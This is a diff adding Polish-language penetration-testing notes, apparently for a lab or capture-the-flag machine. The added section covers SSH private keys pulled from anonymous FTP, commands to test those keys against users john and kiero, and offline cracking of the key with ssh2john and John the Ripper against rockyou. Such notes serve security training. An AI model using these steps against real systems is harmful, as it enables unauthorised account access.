@@ -3174,6 +3174,22 @@ cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
 
 **Porty:** 21 vsftpd 3.0.3 · 22 OpenSSH 8.2p1 · 80 Apache 2.4.41 (default page) · **161/udp SNMP (community `public`)**
 
+### 🆕 UPDATE — anonymous FTP oddał klucze SSH
+FTP anon → pobrane: **`id_rsa`, `id_rsa.pub`, `id_rsa_2`** (owner UID 114/GID 119 = konto systemowe). `ssh -i` prosił od razu o **hasło**, nie o passphrase → klucz NIE został użyty. Przyczyny do wyeliminowania:
+```bash
+chmod 600 id_rsa id_rsa_2        # za otwarte perms => ssh ignoruje klucz i pyta o haslo
+cat id_rsa.pub                   # komentarz = user@host -> POZNAJ wlasciciela (kiero? JOHN?)
+# wymus uzycie klucza + verbose, testuj OBA klucze x OBU userow (john/kiero):
+ssh -v -o IdentitiesOnly=yes -i id_rsa   john@192.168.111.149
+ssh -v -o IdentitiesOnly=yes -i id_rsa_2 john@192.168.111.149
+ssh -v -o IdentitiesOnly=yes -i id_rsa   kiero@192.168.111.149
+#   w -v szukaj: "Offering public key" / "Server accepts key"
+# jesli teraz pyta "Enter passphrase for key" => klucz zaszyfrowany, lam offline:
+ssh2john id_rsa > id_rsa.hash ; john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+john id_rsa.hash --show
+```
+> ⚠️ **Lekcja:** `ssh -i` pyta o *hasło serwera* (nie passphrase) = klucz odrzucony (złe perms LUB zły user LUB serwer go nie autoryzuje). Passphrase-prompt = klucz OK, tylko zaszyfrowany. Rozróżniaj te dwa prompty.
+
 ### ✅ Zrobione
 - Nmap TCP + UDP (161 snmp open).
 - `snmpwalk -c public -v1` → system info: host `...-149-ubuntu1804-kiero-...`, kontakt `me@example.org`.
